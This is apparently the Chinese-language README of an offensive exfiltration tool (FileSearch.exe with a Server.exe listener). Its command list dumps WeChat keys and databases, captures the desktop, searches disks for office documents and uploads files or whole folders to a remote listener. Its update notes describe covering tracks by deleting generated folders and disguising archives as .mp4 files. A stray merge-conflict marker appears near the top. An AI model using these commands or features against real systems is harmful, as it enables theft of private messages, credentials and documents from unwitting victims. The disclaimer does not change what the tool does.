### Server

<<<<<<< HEAD
```plain
Server.exe port # 默认8888端口
```

### Command

```plain
[+] FileSearch.exe dumpkey # 获取微信密钥
[+] FileSearch.exe send 127.0.0.1 8888 # 从默认路径回传微信数据库
[+] FileSearch.exe send 127.0.0.1 8888 vxpath # 指定微信数据库路径
[+] FileSearch.exe photo 127.0.0.1 8888 # 桌面截屏回传
[+] FileSearch.exe search d:\ .docx # 查找指定类型文件
[+] FileSearch.exe upload path 127.0.0.1 8888 # 上传文件
[+] FileSearch.exe uploads path 127.0.0.1 8888 # 上传文件夹
[+] FileSearch.exe all 127.0.0.1 8888  # 全盘获取指定类型文件
[+] FileSearch.exe user 127.0.0.1 8888 # c:\users目录下查找类型文件
```

### 更新说明

1、all参数排除了c盘符查找指定类型文件，避免大量缓存文件造成卡顿，添加user参数在c:\users目录下查找

可自行修改需要上传的文件类型（747行），默认为：

```plain
	const char* filetype[] = { ".doc",".xls", ".pdf" ,".docx",".xlsx",".txt",".bat",".ppt",".pptx" };
```

2、运行成功后会自动删除生成出来的文件夹以及压缩包，压缩包文件随机修改成了mp4后缀

3、优化了查找文件匹配方式，支持模糊匹配或精确匹配

4、新增uploads参数遍历指定文件夹压缩上传功能

5、新增photo参数桌面截屏回传功能

### 功能展示：

![img](https://cdn.nlark.com/yuque/0/2022/png/32539762/1668769423893-416c9225-1319-4133-a468-3cb6cee900d4.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/32539762/1668770076653-85c5e09c-e9a8-436f-8ce5-8987cc079882.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/32539762/1668772513228-738d3cd4-5aef-49e5-9d31-6df8d9c6e8f9.png)

## 已知问题：

测试在1M带宽的服务器上传输大文件（G级）可能会损坏，感觉这跟双方网络波动有一定关系，后续会改成自动分卷压缩来上传，目前暂用的解决办法：

例如本地自带Rar进行切割，回传后

```plain
C:\Program Files\WinRAR\Rar.exe a -ep1 -m0 -v2mC:\Users\admin\Downloads\1.rar C:\Users\admin\Downloads\xxx.jar
```

注释：-v2m 即分卷的大小为2m 

2、使用WinRAR内置修复功能或者使用[DiskInternals ZIP](https://www.diskinternals.com/zip-repair/)进行修复损坏文件

> 后续还会更新~

如果发现缺陷请提交 issue，非常感谢！

#### 本人失业多年，已不参与大小HW活动的攻击方了，若溯源到id与本人无关

#### 免责声明

 本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。 如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。

